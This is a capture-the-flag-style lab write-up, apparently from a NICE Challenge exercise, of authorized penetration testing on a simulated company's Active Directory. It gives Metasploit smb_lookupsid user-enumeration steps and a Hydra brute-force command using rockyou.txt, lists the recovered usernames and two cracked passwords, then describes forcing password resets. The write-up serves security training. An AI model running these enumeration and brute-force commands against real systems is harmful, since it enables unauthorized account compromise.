## Goals

"We have reason to believe that some of our employees have weaker than should be acceptable passwords, so we want you to conduct authorized penetration testing against various company assets to determine which employees need to change their passwords."

**Use Kali Linux to attempt an attack on Pretty Safe Electronic's Active Directory house on 171.16.30.55**<br><br>
--We will be using Metasploit's Axiliary smblookupsid to exploit the directory to enumerate authorized users. <br>
--We will be using the output from Metasploit output in Hydra to target the specific users on the directory. <br>
--We will use the common "rockyou.txt" wordlist to test against the users for weak passwords. <br><br><br>
**Force password reset on identified users with weak passwords.**<br><br>
--We will login to the domain controller and force password resets for users identified with weak passwords.<br> 

## Tools Used

* Kali Linux 
* Metasploit Console
* SMB
* smb_lookupsid Auxiliary in Metasploit
* Hydra command line tool
* Active Directory (Users and Computers)

## Network Map and targets used<br>
![](https://portal.nice-challenge.com/static/img/PD-map.jpg)<br><br>
Our target is the AD-Server located at 172.16.30.55<br>
We will utilize the Security-Desk workstation located at 172.16.20.55<br><br>

## Actions Taken

* Spin up the Security-Desk workstation and login to player one. 
* Open Terminal and run "sudo msfconsole"
* Select the smb_lookupsid too by running "use auxiliary/scanner/smb_lookupsid" 
* Set target to Active Directory service by running "set RHOSTS 172.16.30.55"
* Set SMB user by running "set SMBUser playerone"
* Set SMB password by running "set SMBPass password123"
* Start exploit by running "exploit"
* Once task is complete, copy output and paste into MousePad.
* Remove all data except found users:<br><br>
rcortes <br>
jsmith <br>
manderson <br>
skeefe <br>
nkeefe <br>
asteele <br>
jraffin <br>
jcortes <br>
tclark <br><br>
* Save document in home directory. (/home/playerone/(KNOWNUSERS).txt)
* Create another empty document in the home directory for Hydra's output. (/home/playerone/(OUTPUT).txt
* Quit metasploit console.
* In Terminal, run "hydra -L /home/playerone/(KNOWNUSERS).txt -P /usr/share/wordlists/rockyou.txt -o /home/playerone/(OUTPUT).txt -v 172.16.30.55 smb"
*Hydra discovered two users who had weak passwords:<br><br>
nkeefe:987654321<br>
jcortes:iloveme<br><br>
* Shut down Security-Desk
* Spin up Domain-Controller
* Select Start Menu > Administrative Tools
* Open Active Directory Users and Computers
* Select prettysafeelectronics.io > Users
* We will adjust the password policy for Jan Cortes (jcortes) & Naomi O'Keefe (nkeefe)
* Select the respective user from the list and open properties from secondary menu. 
* Select the account tab. 
* Uncheck [Password never expires]
* Check [User must change password at next logon]
* Apply changes
* Repeat for second user. 
* /Challenge Complete//




